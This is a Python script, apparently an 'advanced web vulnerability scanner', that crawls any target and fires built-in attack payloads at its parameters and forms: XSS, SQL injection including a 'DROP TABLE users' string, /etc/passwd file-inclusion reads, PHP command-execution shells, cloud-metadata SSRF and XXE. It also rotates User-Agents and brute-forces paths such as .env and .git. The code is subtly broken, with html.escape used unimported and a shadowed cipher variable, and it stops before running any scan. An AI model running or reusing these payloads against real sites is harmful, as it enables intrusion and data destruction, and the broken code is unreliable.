#!/usr/bin/env python3
import requests
import re
import os
import sys
import time
import json
import random
import socket
import ssl
import argparse
import threading
import queue
import urllib3
import dns.resolver
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
DEFAULT_WORDLIST = [
    "admin", "login", "wp-admin", "wp-login.php", "config", "backup", 
    "phpmyadmin", "dbadmin", "administrator", "test", "debug", 
    "api", "graphql", "swagger", "phpinfo", ".git", ".env",
    "backup.zip", "backup.sql", "backup.tar.gz", "robots.txt",
    "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
    "web.config", ".htaccess", ".DS_Store", "README.md"
]

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

# Global variables
vulnerabilities_found = []
request_count = 0
thread_lock = threading.Lock()
ua = UserAgent()

class Scanner:
    def __init__(self, target, wordlist=None, threads=10, timeout=10, output_dir="reports", 
                 crawl_depth=3, proxy=None, rate_limit=1, verify_ssl=False):
        self.target = self.normalize_url(target)
        self.wordlist = wordlist or DEFAULT_WORDLIST
        self.threads = threads
        self.timeout = timeout
        self.output_dir = output_dir
        self.crawl_depth = crawl_depth
        self.proxy = proxy
        self.rate_limit = rate_limit
        self.verify_ssl = verify_ssl
        
        self.visited_urls = set()
        self.session = self.create_session()
        self.technologies = []
        self.waf_detected = None
        self.rate_limit_info = None
        self.cookies = {}
        self.dns_info = {}
        self.ssl_info = {}
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Initialize reports
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.report_file = os.path.join(self.output_dir, f"scan_report_{timestamp}.txt")
        self.report_html = os.path.join(self.output_dir, f"scan_report_{timestamp}.html")
        self.report_json = os.path.join(self.output_dir, f"scan_report_{timestamp}.json")
        self.init_reports()
        
        # Load payloads
        self.payloads = {
            "xss": self.load_payloads("xss_payloads.txt") or [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\"><script>alert(1)</script>",
                "javascript:alert(1)",
                "{{7*7}}",
                "${alert(1)}"
            ],
            "sqli": self.load_payloads("sql_payloads.txt") or [
                "'",
                "' OR 1=1--",
                "\" OR \"1\"=\"1",
                "' UNION SELECT null,username,password FROM users--",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))abc)",
                "1; DROP TABLE users--"
            ],
            "lfi": self.load_payloads("lfi_payloads.txt") or [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ",
                "....//....//....//etc/passwd",
                "%2e%2e%2fetc%2fpasswd"
            ],
            "rce": self.load_payloads("rce_payloads.txt") or [
                ";id",
                "|id",
                "`id`",
                "$(id)",
                "<?php system($_GET['cmd']); ?>",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
            ],
            "ssrf": self.load_payloads("ssrf_payloads.txt") or [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost/admin",
                "file:///etc/passwd",
                "http://127.0.0.1:8080",
                "http://[::1]:80"
            ],
            "xxe": self.load_payloads("xxe_payloads.txt") or [
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
            ],
            "ssti": self.load_payloads("ssti_payloads.txt") or [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "@(7*7)"
            ],
            "open_redirect": self.load_payloads("open_redirect_payloads.txt") or [
                "https://evil.com",
                "//evil.com",
                "http://google.com",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>"
            ]
        }

    def normalize_url(self, url):
        """Normalize the URL to ensure consistent format"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')

    def create_session(self):
        """Create and configure the requests session"""
        session = requests.Session()
        session.verify = self.verify_ssl
        session.headers.update(DEFAULT_HEADERS)
        
        if self.proxy:
            session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        
        return session

    def load_payloads(self, filename):
        """Load payloads from file if exists"""
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        return None

    def init_reports(self):
        """Initialize report files"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Text report
        with open(self.report_file, 'w') as f:
            f.write(f"=== Web Vulnerability Scan Report ===\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Start Time: {timestamp}\n")
            f.write(f"Threads: {self.threads}\n")
            f.write(f"Timeout: {self.timeout}s\n\n")
            
        # HTML report
        with open(self.report_html, 'w') as f:
            f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>Web Vulnerability Scan Report</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; }}
        h1, h2 {{ color: #333; }}
        .vulnerability {{ margin-bottom: 15px; padding: 10px; border-left: 4px solid; }}
        .critical {{ border-color: #ff0000; background-color: #ffebee; }}
        .high {{ border-color: #ff5722; background-color: #fff3e0; }}
        .medium {{ border-color: #ffc107; background-color: #fffde7; }}
        .low {{ border-color: #4caf50; background-color: #e8f5e9; }}
        .info {{ border-color: #2196f3; background-color: #e3f2fd; }}
        pre {{ background-color: #f5f5f5; padding: 10px; border-radius: 3px; overflow-x: auto; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        .summary-card {{ 
            background: #fff; 
            border-radius: 5px; 
            box-shadow: 0 2px 5px rgba(0,0,0,0.1); 
            padding: 20px; 
            margin-bottom: 20px;
        }}
        .progress-bar {{ 
            height: 20px; 
            background-color: #e0e0e0; 
            border-radius: 3px; 
            margin-bottom: 10px;
        }}
        .progress {{ 
            height: 100%; 
            border-radius: 3px; 
            background-color: #4CAF50;
        }}
    </style>
</head>
<body>
    <h1>Web Vulnerability Scan Report</h1>
    <div class="summary-card">
        <p><strong>Target:</strong> {self.target}</p>
        <p><strong>Start Time:</strong> {timestamp}</p>
        <p><strong>Threads:</strong> {self.threads}</p>
        <p><strong>Timeout:</strong> {self.timeout}s</p>
    </div>
    <hr>
""")

    def log(self, message, level="info", details=None, request=None):
        """Log messages to console and report files"""
        colors = {
            "critical": Fore.RED,
            "high": Fore.YELLOW,
            "medium": Fore.CYAN,
            "low": Fore.GREEN,
            "info": Fore.WHITE
        }
        
        # Console output
        print(f"{colors.get(level, Fore.WHITE)}[{level.upper()}] {message}{Style.RESET_ALL}")
        if details:
            print(f"{Fore.WHITE}Details: {details}{Style.RESET_ALL}")
        
        # Text report
        with open(self.report_file, 'a') as f:
            f.write(f"[{level.upper()}] {message}\n")
            if details:
                f.write(f"Details: {details}\n")
            if request:
                f.write(f"Request: {request}\n")
        
        # HTML report
        with open(self.report_html, 'a') as f:
            f.write(f"""
<div class="vulnerability {level}">
    <h3>[{level.upper()}] {html.escape(message)}</h3>
    {f'<pre>{html.escape(str(details))}</pre>' if details else ''}
    {f'<pre>Request: {html.escape(str(request))}</pre>' if request else ''}
</div>
""")
        
        # Track vulnerabilities
        if level in ["critical", "high", "medium", "low"]:
            vulnerabilities_found.append({
                "type": level,
                "message": message,
                "details": details,
                "request": request,
                "timestamp": datetime.now().isoformat()
            })

    def get_html(self, url):
        """Fetch HTML content with error handling"""
        global request_count
        try:
            with thread_lock:
                request_count += 1
                self.session.headers.update({"User-Agent": ua.random})
                
                # Rate limiting
                if self.rate_limit > 0:
                    time.sleep(1 / self.rate_limit)
                
                response = self.session.get(url, timeout=self.timeout)
                
                # Store cookies if any
                if response.cookies:
                    self.cookies.update(response.cookies.get_dict())
                
                return response.text
        except Exception as e:
            self.log(f"Error fetching {url}: {str(e)}", "info")
            return None

    def get_forms(self, url):
        """Extract all forms from a page"""
        html = self.get_html(url)
        if not html:
            return []
        
        soup = BeautifulSoup(html, 'html.parser')
        return soup.find_all('form')

    def get_all_links(self, url):
        """Extract all links from a page"""
        urls = set()
        html = self.get_html(url)
        if not html:
            return urls
        
        soup = BeautifulSoup(html, 'html.parser')
        
        tags = ['a', 'link', 'script', 'img', 'iframe', 'form', 'frame', 'embed', 'object']
        for tag in soup.find_all(tags):
            for attr in ['href', 'src', 'action', 'data', 'codebase']:
                if tag.has_attr(attr):
                    full_url = urljoin(url, tag[attr])
                    if self.target in full_url and full_url not in self.visited_urls:
                        urls.add(full_url)
        
        # Also check meta refresh and JavaScript locations
        for meta in soup.find_all('meta', {'http-equiv': 'refresh'}):
            content = meta.get('content', '')
            if content and 'url=' in content.lower():
                url_part = content.split('url=')[1]
                full_url = urljoin(url, url_part)
                if self.target in full_url and full_url not in self.visited_urls:
                    urls.add(full_url)
        
        return urls

    def crawl(self):
        """Crawl the website up to a certain depth"""
        self.log(f"Starting crawl of {self.target} (max depth: {self.crawl_depth})", "info")
        to_visit = [(self.target, 0)]
        all_urls = set()
        
        while to_visit:
            url, depth = to_visit.pop(0)
            
            if depth > self.crawl_depth:
                continue
                
            if url in self.visited_urls:
                continue
                
            self.visited_urls.add(url)
            self.log(f"Crawling: {url} (depth: {depth})", "info")
            
            try:
                links = self.get_all_links(url)
                for link in links:
                    if link not in all_urls:
                        all_urls.add(link)
                        to_visit.append((link, depth + 1))
            except Exception as e:
                self.log(f"Error crawling {url}: {str(e)}", "info")
        
        return all_urls

    def check_security_headers(self):
        """Check for missing security headers"""
        self.log("Checking security headers...", "info")
        try:
            response = self.session.get(self.target)
            headers = response.headers
            
            security_headers = {
                "X-XSS-Protection": ("1; mode=block", "Protects against XSS attacks"),
                "X-Content-Type-Options": ("nosniff", "Prevents MIME type sniffing"),
                "X-Frame-Options": ("DENY", "Prevents clickjacking attacks"),
                "Content-Security-Policy": (None, "Mitigates XSS, clickjacking, and other attacks"),
                "Strict-Transport-Security": (None, "Enforces HTTPS connections"),
                "Referrer-Policy": ("no-referrer", "Controls referrer information"),
                "Feature-Policy": (None, "Restricts browser features"),
                "Permissions-Policy": (None, "Newer replacement for Feature-Policy"),
                "Cross-Origin-Embedder-Policy": (None, "Prevents cross-origin attacks"),
                "Cross-Origin-Opener-Policy": (None, "Prevents cross-origin window attacks"),
                "Cross-Origin-Resource-Policy": (None, "Prevents cross-origin resource attacks")
            }
            
            results = []
            for header, (expected_value, description) in security_headers.items():
                if header not in headers:
                    results.append((header, "MISSING", description))
                elif expected_value and headers[header].lower() != expected_value.lower():
                    results.append((header, headers[header], f"Expected: {expected_value}"))
            
            if results:
                table = "Security Header Check Results:\n"
                table += "Header | Status | Recommendation\n"
                table += "------ | ------ | --------------\n"
                for header, status, recommendation in results:
                    table += f"{header} | {status} | {recommendation}\n"
                
                self.log("Missing or misconfigured security headers found", "medium", table)
            else:
                self.log("All security headers are properly configured", "info")
        except Exception as e:
            self.log(f"Error checking security headers: {str(e)}", "info")

    def detect_technologies(self):
        """Detect web technologies in use"""
        self.log("Detecting technologies...", "info")
        try:
            response = self.session.get(self.target)
            headers = response.headers
            html = response.text
            
            # Check headers for common tech indicators
            tech_indicators = {
                "Server": "web server",
                "X-Powered-By": "backend technology",
                "X-Generator": "CMS",
                "X-Drupal-Cache": "Drupal CMS",
                "X-WP-Total": "WordPress",
                "X-AspNet-Version": "ASP.NET",
                "X-AspNetMvc-Version": "ASP.NET MVC",
                "X-Runtime": "Ruby on Rails",
                "X-Request-ID": "various frameworks",
                "X-Varnish": "Varnish cache",
                "Via": "proxy/cache servers"
            }
            
            detected = []
            for header, tech in tech_indicators.items():
                if header in headers:
                    detected.append(f"{tech}: {headers[header]}")
            
            # Check HTML for framework signatures
            framework_patterns = {
                "WordPress": ["wp-content", "wp-includes", "wordpress"],
                "Joomla": ["/media/jui/", "joomla", "Joomla!"],
                "Drupal": ["drupal", "sites/all/"],
                "Laravel": ["laravel", "mix-manifest.json"],
                "React": ["react", "react-dom"],
                "Vue.js": ["vue", "vue.js"],
                "Angular": ["angular", "ng-"],
                "Django": ["csrfmiddlewaretoken", "django"],
                "Flask": ["flask", "werkzeug"],
                "Ruby on Rails": ["rails", "csrf-token"]
            }
            
            for framework, patterns in framework_patterns.items():
                if any(pattern.lower() in html.lower() for pattern in patterns):
                    detected.append(framework)
            
            # Check for common JavaScript libraries
            js_libraries = {
                "jQuery": ["jquery", "jquery.min.js"],
                "Bootstrap": ["bootstrap", "bootstrap.min.js"],
                "Modernizr": ["modernizr"],
                "Font Awesome": ["font-awesome", "fa-"],
                "Google Analytics": ["ga.js", "analytics.js", "gtag.js"]
            }
            
            for lib, patterns in js_libraries.items():
                if any(pattern.lower() in html.lower() for pattern in patterns):
                    detected.append(lib)
            
            if detected:
                self.technologies = list(set(detected))  # Remove duplicates
                self.log(f"Detected technologies: {', '.join(self.technologies)}", "info")
            else:
                self.log("No technologies detected", "info")
        except Exception as e:
            self.log(f"Error detecting technologies: {str(e)}", "info")

    def detect_waf(self):
        """Detect if a WAF is present"""
        self.log("Checking for WAF...", "info")
        try:
            response = self.session.get(self.target)
            headers = response.headers
            
            waf_indicators = [
                "cloudflare", "incapsula", "sucuri", "akamai",
                "barracuda", "fortinet", "imperva", "f5",
                "mod_security", "citrix", "radware", "awsalb",
                "fastly", "cloudfront", "prolexic", "zscaler"
            ]
            
            for header, value in headers.items():
                if any(waf in header.lower() or waf in value.lower() for waf in waf_indicators):
                    self.waf_detected = f"{header}: {value}"
                    self.log(f"WAF detected: {self.waf_detected}", "high")
                    return
            
            # Check response time for WAF challenges
            test_payload = "/?<script>alert(1)</script>"
            start_time = time.time()
            self.session.get(urljoin(self.target, test_payload))
            response_time = time.time() - start_time
            
            if response_time > 2:  # WAFs often add delay
                self.log("Potential WAF detected based on response delay", "medium")
                self.waf_detected = "Detected by response delay"
            
            if not self.waf_detected:
                self.log("No WAF detected", "info")
        except Exception as e:
            self.log(f"Error detecting WAF: {str(e)}", "info")

    def check_rate_limiting(self):
        """Check if rate limiting is in place"""
        self.log("Checking for rate limiting...", "info")
        try:
            delays = []
            for _ in range(5):
                start_time = time.time()
                self.session.get(self.target)
                delays.append(time.time() - start_time)
                time.sleep(0.5)
            
            avg_delay = sum(delays) / len(delays)
            if avg_delay > 1.5:
                self.rate_limit_info = f"Average response time: {avg_delay:.2f}s (possible rate limiting)"
                self.log(self.rate_limit_info, "medium")
            else:
                self.log("No significant rate limiting detected", "info")
        except Exception as e:
            self.log(f"Error checking rate limiting: {str(e)}", "info")

    def check_dns(self):
        """Perform DNS checks on the target domain"""
        self.log("Performing DNS checks...", "info")
        try:
            domain = urlparse(self.target).netloc
            if ":" in domain:
                domain = domain.split(":")[0]
            
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            resolver.lifetime = 5
            
            records = {
                "A": [],
                "AAAA": [],
                "MX": [],
                "NS": [],
                "TXT": [],
                "CNAME": []
            }
            
            for record_type in records.keys():
                try:
                    answers = resolver.resolve(domain, record_type)
                    records[record_type] = [str(r) for r in answers]
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
                    pass
            
            self.dns_info = records
            self.log(f"DNS records found: {json.dumps(records, indent=2)}", "info")
        except Exception as e:
            self.log(f"Error performing DNS checks: {str(e)}", "info")

    def check_ssl(self):
        """Check SSL/TLS configuration of the target"""
        self.log("Checking SSL/TLS configuration...", "info")
        try:
            hostname = urlparse(self.target).netloc
            if ":" in hostname:
                hostname = hostname.split(":")[0]
            
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    protocol = ssock.version()
                    
                    self.ssl_info = {
                        "subject": dict(x[0] for x in cert["subject"]),
                        "issuer": dict(x[0] for x in cert["issuer"]),
                        "valid_from": cert["notBefore"],
                        "valid_to": cert["notAfter"],
                        "protocol": protocol,
                        "cipher": cipher,
                        "serial_number": cert.get("serialNumber", ""),
                        "alt_names": [name[1] for name in cert.get("subjectAltName", [])]
                    }
                    
                    # Check for weak protocols/ciphers
                    weak_protocols = ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]
                    weak_ciphers = ["RC4", "DES", "3DES", "MD5", "SHA1", "CBC"]
                    
                    issues = []
                    if protocol in weak_protocols:
                        issues.append(f"Weak protocol: {protocol}")
                    
                    if any(cipher in cipher[0] for cipher in weak_ciphers):
                        issues.append(f"Weak cipher: {cipher[0]}")
                    
                    if issues:
                        self.log("SSL/TLS vulnerabilities found", "medium", "\n".join(issues))
                    else:
                        self.log("SSL/TLS configuration appears secure", "info")
        except Exception as e:
            self.log(f"Error checking SSL/TLS: {str(e)}", "info")

    def test_xss(self, url):
        """Test for XSS vulnerabilities"""
        self.log(f"Testing XSS on {url}", "info")
        
        # Test reflected XSS in URL parameters
        if "=" in url:
            for payload in self.payloads["xss"]:
                test_url = url.split('=')[0] + '=' + quote(payload)
                try:
                    response = self.session.get(test_url)
                    
                    # Check if payload appears in response without being sanitized
                    if payload in response.text and not any(
                        block in response.text 
                        for block in ["blocked", "forbidden", "security", "detected"]
                    ):
                        details = {
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "matched_content": response.text[:200] + "..." if len(response.text) > 200 else response.text
                        }
                        self.log(f"Reflected XSS found: {test_url}", "high", details, test_url)
                        break
                except Exception as e:
                    self.log(f"Error testing XSS payload {payload}: {str(e)}", "info")
        
        # Test stored XSS in forms
        forms = self.get_forms(url)
        for form in forms:
            action = form.get('action', '').strip()
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    form_data[name] = random.choice(self.payloads["xss"])
            
            try:
                if method == 'post':
                    response = self.session.post(form_url, data=form_data)
                else:
                    response = self.session.get(form_url, params=form_data)
                
                # Check if any payload appears in response
                for payload in form_data.values():
                    if payload in response.text:
                        details = {
                            "form_url": form_url,
                            "form_method": method,
                            "payload": payload,
                            "response_code": response.status_code
                        }
                        self.log(f"Potential XSS in form at {form_url}", "high", details)
                        break
            except Exception as e:
                self.log(f"Error testing form XSS: {str(e)}", "info")

    def test_sqli(self, url):
        """Test for SQL injection vulnerabilities"""
        self.log(f"Testing SQLi on {url}", "info")
        
        if "=" in url:
            for payload in self.payloads["sqli"]:
                test_url = url.split('=')[0] + '=' + quote(payload)
                try:
                    response = self.session.get(test_url)
                    
                    # Check for common error messages
                    errors = [
                        "sql syntax", "mysql", "ora-", "syntax error",
                        "unclosed quotation mark", "warning: mysql",
                        "unexpected end", "pg_query", "sqlserver",
                        "odbc", "jdbc", "mysql_fetch"
                    ]
                    
                    if any(error in response.text.lower() for error in errors):
                        details = {
                            "payload": payload,
                            "error_matched": next((error for error in errors if error in response.text.lower()), None),
                            "response_code": response.status_code
                        }
                        self.log(f"Potential SQLi found: {test_url}", "critical", details, test_url)
                        break
                    
                    # Check for time-based SQLi
                    if "SLEEP" in payload or "WAITFOR DELAY" in payload:
                        start_time = time.time()
                        self.session.get(test_url)
                        elapsed = time.time() - start_time
                        if elapsed > 5:
                            details = {
                                "payload": payload,
                                "response_time": f"{elapsed:.2f}s",
                                "expected_delay": "5s"
                            }
                            self.log(f"Potential time-based SQLi: {test_url}", "critical", details, test_url)
                            break
                except Exception as e:
                    self.log(f"Error testing SQLi payload {payload}: {str(e)}", "info")

    def test_lfi(self, url):
        """Test for Local File Inclusion vulnerabilities"""
        self.log(f"Testing LFI on {url}", "info")
        
        if "=" in url:
            for payload in self.payloads["lfi"]:
                test_url = url.split('=')[0] + '=' + quote(payload)
                try:
                    response = self.session.get(test_url)
                    
                    # Check for common LFI indicators
                    indicators = [
                        "root:x:", "[boot loader]", "<?php", "mysql",
                        "apache", "DocumentRoot", "HTTP_USER_AGENT",
                        "include(", "require(", "file_get_contents("
                    ]
                    
                    matched = next((ind for ind in indicators if ind in response.text), None)
                    if matched:
                        details = {
                            "payload": payload,
                            "indicator_matched": matched,
                            "response_code": response.status_code,
                            "response_sample": response.text[:200] + "..." if len(response.text) > 200 else response.text
                        }
                        self.log(f"Potential LFI found: {test_url}", "high", details, test_url)
                        break
                except Exception as e:
                    self.log(f"Error testing LFI payload {payload}: {str(e)}", "info")

    def test_rce(self, url):
        """Test for Remote Code Execution vulnerabilities"""
        self.log(f"Testing RCE on {url}", "info")
        
        if "=" in url:
            for payload in self.payloads["rce"]:
                test_url = url.split('=')[0] + '=' + quote(payload)
                try:
                    response = self.session.get(test_url)
                    
                    # Check for command execution results
                    if "uid=" in response.text or "gid=" in response.text or "windows" in response.text.lower():
                        details = {
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_sample": response.text[:200] + "..." if len(response.text) > 200 else response.text
                        }
                        self.log(f"Potential RCE found: {test_url}", "critical", details, test_url)
                        break
                except Exception as e:
                    self.log(f"Error testing RCE payload {payload}: {str(e)}", "info")

    def test_ssrf(self, url):
        """Test for Server-Side Request Forgery vulnerabilities"""
        self.log(f"Testing SSRF on {url}", "info")
        
        if "=" in url:
            for payload in self.payloads["ssrf"]:
                test_url = url.split('=')[0] + '=' + quote(payload)
                try:
                    response = self.session.get(test_url)
                    
                    # Check for common SSRF responses
                    if "EC2" in response.text or "metadata" in response.text or "localhost" in response.text:
                        details = {
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_sample": response.text[:200] + "..." if len(response.text) > 200 else response.text
                        }
                        self.log(f"Potential SSRF found: {test_url}", "high", details, test_url)
                        break
                except Exception as e:
                    self.log(f"Error testing SSRF payload {payload}: {str(e)}", "info")

    def test_xxe(self, url):
        """Test for XXE (XML External Entity) vulnerabilities"""
        self.log(f"Testing XXE on {url}", "info")
        
        # First check if the endpoint accepts XML
        headers = {"Content-Type": "application/xml"}
        test_payload = "<test>1</test>"
        
        try:
            response = self.session.post(url, data=test_payload, headers=headers)
            if "xml" not in response.headers.get("Content-Type", "").lower():
                self.log(f"Endpoint {url} doesn't appear to accept XML", "info")
                return
        except:
            return
        
        # Test XXE payloads
        for payload in self.payloads["xxe"]:
            try:
                response = self.session.post(url, data=payload, headers=headers)
                
                # Check for common XXE indicators
                if "/etc/passwd" in response.text or "root:" in response.text:
                    details = {
                        "payload": payload,
                        "response_code": response.status_code,
                        "response_sample": response.text[:200] + "..." if len(response.text) > 200 else response.text
                    }
                    self.log(f"Potential XXE found: {url}", "critical", details, payload)
                    break
            except Exception as e:
                self.log(f"Error testing XXE payload: {str(e)}", "info")

    def test_ssti(self, url):
        """Test for Server-Side Template Injection vulnerabilities"""
        self.log(f"Testing SSTI on {url}", "info")
        
        if "=" in url:
            for payload in self.payloads["ssti"]:
                test_url = url.split('=')[0] + '=' + quote(payload)
                try:
                    response = self.session.get(test_url)
                    
                    # Check for template engine responses
                    if "49" in response.text:  # 7*7=49
                        details = {
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_sample": response.text[:200] + "..." if len(response.text) > 200 else response.text
                        }
                        self.log(f"Potential SSTI found: {test_url}", "high", details, test_url)
                        break
                except Exception as e:
                    self.log(f"Error testing SSTI payload {payload}: {str(e)}", "info")

    def test_open_redirect(self, url):
        """Test for Open Redirect vulnerabilities"""
        self.log(f"Testing Open Redirect on {url}", "info")
        
        if "=" in url:
            for payload in self.payloads["open_redirect"]:
                test_url = url.split('=')[0] + '=' + quote(payload)
                try:
                    response = self.session.get(test_url, allow_redirects=False)
                    
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get("Location", "")
                        if payload in location or "evil.com" in location:
                            details = {
                                "payload": payload,
                                "redirect_location": location,
                                "response_code": response.status_code
                            }
                            self.log(f"Potential Open Redirect found: {test_url}", "medium", details, test_url)
                            break
                except Exception as e:
                    self.log(f"Error testing Open Redirect payload {payload}: {str(e)}", "info")

    def brute_directories(self):
        """Brute force common directories and files"""
        self.log(f"Brute forcing directories with {len(self.wordlist)} entries...", "info")
        
        def test_path(path):
            full_url = urljoin(self.target, path)
            try:
                response = self.session.get(full_url)
                
                result = {
                    "url": full_url,
                    "status": response.status_code,
                    "length": len(response.text),
                    "redirect": response.headers.get("Location", "") if response.history else ""
                }
                
                return result
            except Exception as e:
                return {"url": full_url, "error": str(e)}
        
        # Use ThreadPoolExecutor for better performance
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_path, path): path for path in self.wordlist}
            
            for future in as_completed(futures):
                path = futures[future]
                try:
                    result = future.result()
                    
                    if "error" in result:
                        continue
                    
                    if result["status"] == 200:
                        self.log(f"Found accessible path: {result['url']}", "medium")
                    elif result["status"] == 403:
                        self.log(f"Forbidden path (403): {result['url']}", "low")
                    elif result["status"] in [301, 302] and result["redirect"]:
                        self.log(f"Redirect found: {result['url']} -> {result['redirect']}", "info")
                except Exception as e:
                    self.log(f"Error testing path {path}: {str(e)}", "info")

    def scan(self):
        """Run complete scan"""
        start_time = time.time()
        
        # Initial checks
        self.log("Starting comprehensive web vulnerability scan", "info")
        self.detect_technologies()
        self.detect_waf()
        self.check_rate_limiting()
        self.check_security_headers()
        self.check_dns()
        self.check_ssl()
        
        # Crawl and test all pages
        all_urls = self.crawl()
        self.log(f"Found {len(all_urls)} unique URLs to test", "info")
        
        # Test each URL for vulnerabilities
        for url in all_urls:
            self.test_xss(url)
            self.test_sqli(url)
            self.test_lfi(url)
            self.test_rce(url)
            self.test_ssrf(url)
            self.test_xxe(url)
            self.test_ssti(url)
            self.test_open_redirect(url)
        
        # Brute force directories in parallel
        self.brute_directories()
        
        # Final report
        scan_time = time.time() - start_time
        self.log(f"Scan completed in {scan_time:.2f} seconds", "info")
        self.log(f"Total requests made: {request_count}", "info")
        
        # Generate summary
        vuln_counts = {
            "critical": 0,
            "high": 0,
            "medium": 0,
            "low": 0
        }
        
        for vuln in vulnerabilities_found:
            vuln_counts[vuln["type"]] += 1
        
        # Generate JSON report
        report_data = {
            "target": self.target,
            "start_time": datetime.fromtimestamp(start_time).isoformat(),
            "end_time": datetime.now().isoformat(),
            "duration_seconds": scan_time,
            "total_requests": request_count,
            "technologies": self.technologies,
            "waf": self.waf_detected,
            "rate_limiting": self.rate_limit_info,
            "dns": self.dns_info,
            "ssl": self.ssl_info,
            "vulnerabilities": vulnerabilities_found,
            "summary": vuln_counts
        }
        
        with open(self.report_json, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        # Complete HTML report
        with open(self.report_html, 'a') as f:
            f.write(f"""
<hr>
<div class="summary-card">
    <h2>Scan Summary</h2>
    
    <div class="progress-bar">
        <div class="progress" style="width: {min(100, (request_count/1000)*100)}%"></div>
    </div>
    <p><strong>Total Requests:</strong> {request_count}</p>
    
    <table>
        <tr>
            <th>Vulnerability Level</th>
            <th>Count</th>
        </tr>
        <tr>
            <td>Critical</td>
            <td>{vuln_counts['critical']}</td>
        </tr>
        <tr>
            <td>High</td>
            <td>{vuln_counts['high']}</td>
        </tr>
        <tr>
            <td>Medium</td>
            <td>{vuln_counts['medium']}</td>
        </tr>
        <tr>
            <td>Low</td>
            <td>{vuln_counts['low']}</td>
        </tr>
    </table>
    
    <p><strong>Scan Duration:</strong> {scan_time:.2f} seconds</p>
    <p><strong>Technologies Detected:</strong> {', '.join(self.technologies) if self.technologies else 'None detected'}</p>
    <p><strong>WAF Detected:</strong> {self.waf_detected or 'None detected'}</p>
    <p><strong>Rate Limiting:</strong> {self.rate_limit_info or 'Not detected'}</p>
    <p><strong>SSL/TLS:</strong> {self.ssl_info.get('protocol', 'Unknown')} with {self.ssl_info.get('cipher', 'Unknown cipher')}</p>
</div>
</body>
</html>
""")

        # Print final summary to console
        print(f"\n{Fore.CYAN}=== Scan Summary ===")
        print(f"{Fore.WHITE}Target: {self.target}")
        print(f"Duration: {scan_time:.2f} seconds")
        print(f"Total Requests: {request_count}")
        print(f"\n{Fore.RED}Critical: {vuln_counts['critical']}")
        print(f"{Fore.YELLOW}High: {vuln_counts['high']}")
        print(f"{Fore.CYAN}Medium: {vuln_counts['medium']}")
        print(f"{Fore.GREEN}Low: {vuln_counts['low']}")
        print(f"\nReports saved to:")
        print(f"- {self.report_file}")
        print(f"- {self.report_html}")
        print(f"- {self.report_json}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Web Vulnerability Scanner")
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("-w", "--wordlist", help="Path to custom wordlist file")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use")
    parser.add_argument("-o", "--output", default="reports", help="Output directory for reports")
    parser.add_argument("-to", "--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth")
    parser.add_argument("-p", "--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-r", "--rate", type=int, default=5, help="Max requests per second")
